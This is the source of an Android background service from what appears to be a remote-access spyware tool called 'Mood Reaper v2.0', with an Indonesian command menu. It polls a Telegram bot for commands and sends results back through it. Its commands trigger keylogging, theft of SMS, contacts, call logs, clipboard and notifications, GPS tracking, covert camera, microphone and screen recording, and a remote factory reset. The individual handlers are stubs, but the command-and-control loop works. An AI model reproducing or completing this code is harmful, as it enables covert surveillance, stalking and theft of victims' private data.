package com.mood.reaper;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import okhttp3.*;
import org.json.JSONObject;

public class CommandHandler extends Service {
    private static final String BOT_TOKEN = "YOUR_TOKEN";
    private static final String CHAT_ID = "YOUR_CHAT_ID";
    private OkHttpClient client = new OkHttpClient();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            int lastUpdateId = 0;
            while (true) {
                try {
                    String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1);
                    Response res = client.newCall(new Request.Builder().url(url).build()).execute();
                    String json = res.body().string();
                    JSONObject obj = new JSONObject(json);
                    if (obj.getBoolean("ok")) {
                        for (Object o : obj.getJSONArray("result")) {
                            JSONObject update = (JSONObject) o;
                            lastUpdateId = update.getInt("update_id");
                            String text = update.getJSONObject("message").getString("text");
                            processCommand(text);
                        }
                    }
                    Thread.sleep(3000);
                } catch (Exception e) {}
            }
        }).start();
        return START_STICKY;
    }

    private void processCommand(String cmd) {
        switch (cmd) {
            case "/keylog": startKeylogger(); break;
            case "/sms": sendSMS(); break;
            case "/calls": sendCallLogs(); break;
            case "/contacts": sendContacts(); break;
            case "/location": sendLocation(); break;
            case "/record_audio": startAudioRecord(); break;
            case "/photo": takePhoto(); break;
            case "/video": recordVideo(); break;
            case "/camera_stream": startCameraStream(); break;
            case "/screen": startScreenRecord(); break;
            case "/files": listFiles(); break;
            case "/clipboard": getClipboard(); break;
            case "/apps": listApps(); break;
            case "/device": sendDeviceInfo(); break;
            case "/wifi": scanWifi(); break;
            case "/sim": sendSimInfo(); break;
            case "/notif": startNotificationListener(); break;
            case "/autoreply": enableAutoReply(); break;
            case "/reset": factoryReset(); break;
            case "/help": sendHelp(); break;
        }
    }

    private void sendHelp() {
        String help = 
            "💀 MOOD REAPER v2.0 COMMANDS\n" +
            "─────────────────────\n" +
            "/keylog - Aktifkan keylogger\n" +
            "/sms - Ambil semua SMS\n" +
            "/calls - Riwayat panggilan\n" +
            "/contacts - Daftar kontak\n" +
            "/location - GPS realtime\n" +
            "/record_audio - Rekam suara 30s\n" +
            "/photo - Foto dari kamera\n" +
            "/video - Video 10 detik\n" +
            "/camera_stream - Streaming kamera\n" +
            "/screen - Rekam layar\n" +
            "/files - List file di storage\n" +
            "/clipboard - Ambil clipboard\n" +
            "/apps - Aplikasi terinstall\n" +
            "/device - Info perangkat\n" +
            "/wifi - Scan WiFi\n" +
            "/sim - Info SIM\n" +
            "/notif - Forward notifikasi\n" +
            "/autoreply - Auto-reply pesan\n" +
            "/reset - Factory reset (⚠️)\n" +
            "/help - Menu ini";
        sendMsg(help);
    }

    private void sendMsg(String msg) {
        try {
            RequestBody body = new FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", msg)
                .build();
            client.newCall(new Request.Builder()
                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                .post(body)
                .build()).execute();
        } catch (Exception e) {}
    }

    // Semua implementasi method ada di class terpisah (biar gak overload)
    private void startKeylogger() { /* panggil Keylogger.class */ }
    private void sendSMS() { /* panggil SMSHelper */ }
    private void sendCallLogs() { /* panggil CallLogHelper */ }
    private void sendContacts() { /* panggil ContactHelper */ }
    private void sendLocation() { /* panggil LocationHelper */ }
    private void startAudioRecord() { /* panggil AudioRecorder */ }
    private void takePhoto() { /* panggil CameraHelper */ }
    private void recordVideo() { /* panggil VideoRecorder */ }
    private void startCameraStream() { /* panggil CameraStream */ }
    private void startScreenRecord() { /* panggil ScreenRecorder */ }
    private void listFiles() { /* panggil FileExplorer */ }
    private void getClipboard() { /* panggil ClipboardMonitor */ }
    private void listApps() { /* panggil AppList */ }
    private void sendDeviceInfo() { /* panggil DeviceInfo */ }
    private void scanWifi() { /* panggil WifiScanner */ }
    private void sendSimInfo() { /* panggil SimInfo */ }
    private void startNotificationListener() { /* panggil NotifCatcher */ }
    private void enableAutoReply() { /* panggil AutoReply */ }
    private void factoryReset() { /* panggil ResetHelper */ }

    @Override public IBinder onBind(Intent intent) { return null; }
}